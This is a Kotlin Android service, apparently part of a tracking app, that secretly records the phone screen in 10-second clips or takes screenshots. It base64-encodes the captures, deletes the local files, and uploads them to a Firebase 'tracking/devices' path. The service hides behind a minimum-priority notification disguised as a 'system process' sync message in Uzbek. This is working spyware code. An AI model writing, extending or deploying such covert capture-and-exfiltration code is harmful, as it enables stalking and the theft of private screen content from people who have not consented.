package com.hokimloyha.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase
import com.hokimloyha.app.R
import java.io.File

class ScreenRecordService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var targetDeviceId: String = "hokim"
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG = "ScreenRecordService"
        private const val CHANNEL_ID = "screen_record_channel"
        private const val NOTIF_ID = 2002
        const val ACTION_START = "ACTION_START_RECORD"
        const val ACTION_STOP = "ACTION_STOP_RECORD"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        targetDeviceId = intent?.getStringExtra("device_id") ?: "hokim"

        if (action == ACTION_START) {
            val resultCode = AppStateTracker.mediaProjectionResultCode
            val resultData = AppStateTracker.mediaProjectionIntent

            if (resultCode != 0 && resultData != null) {
                startForegroundNotification()
                startScreenRecording(resultCode, resultData)
            } else {
                // MediaProjection mavjud emas bo'lsa -> zudlik bilan ScreenCaptureHelper orqali rasm olamiz
                ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
                stopSelf()
            }
        } else if (action == ACTION_STOP) {
            stopAndUploadRecording()
        }

        return START_NOT_STICKY
    }

    private fun startForegroundNotification() {
        val notif: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Tizim jarayoni")
            .setContentText("Ekran xizmati sinxronizatsiyasi")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun startScreenRecording(resultCode: Int, data: Intent) {
        try {
            val mpManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpManager.getMediaProjection(resultCode, data)

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getMetrics(metrics)

            val width = 480
            val height = 800
            val density = metrics.densityDpi

            outputFile = File(cacheDir, "screen_rec_${System.currentTimeMillis()}.mp4")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(15)
                setVideoEncodingBitRate(800 * 1000) // 800 kbps
                setOutputFile(outputFile?.absolutePath)
                prepare()
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecorder",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface,
                null,
                null
            )

            mediaRecorder?.start()
            Log.d(TAG, "Screen recording started...")

            // 10 soniyadan so'ng avtomatik to'xtatish va yuklash
            handler.postDelayed({
                stopAndUploadRecording()
            }, 10000L)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start screen recording: ${e.message}", e)
            ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
            stopSelf()
        }
    }

    private fun stopAndUploadRecording() {
        handler.removeCallbacksAndMessages(null)
        try {
            mediaRecorder?.stop()
        } catch (_: Exception) {}
        try {
            mediaRecorder?.release()
        } catch (_: Exception) {}
        mediaRecorder = null

        try {
            virtualDisplay?.release()
        } catch (_: Exception) {}
        virtualDisplay = null

        try {
            mediaProjection?.stop()
        } catch (_: Exception) {}
        mediaProjection = null

        val file = outputFile
        if (file != null && file.exists() && file.length() > 0) {
            Thread {
                try {
                    val bytes = file.readBytes()
                    val base64Video = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    file.delete()

                    val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
                    val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")

                    val now = System.currentTimeMillis()
                    val item = mapOf(
                        "type" to "video",
                        "video_base64" to base64Video,
                        "timestamp" to now,
                        "duration" to 10
                    )

                    mediaRef.child("latest_screen").setValue(item)
                    mediaRef.child("archive_screen").push().setValue(item)
                    mediaRef.child("status").setValue("📹 Ekran video yozuvi saqlandi (${bytes.size / 1024} KB)")
                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading screen video", e)
                } finally {
                    stopSelf()
                }
            }.start()
        } else {
            // Video bo'sh bo'lsa, skrinshot olamiz
            ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
            stopSelf()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Recording",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        try { mediaRecorder?.release() } catch (_: Exception) {}
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { mediaProjection?.stop() } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
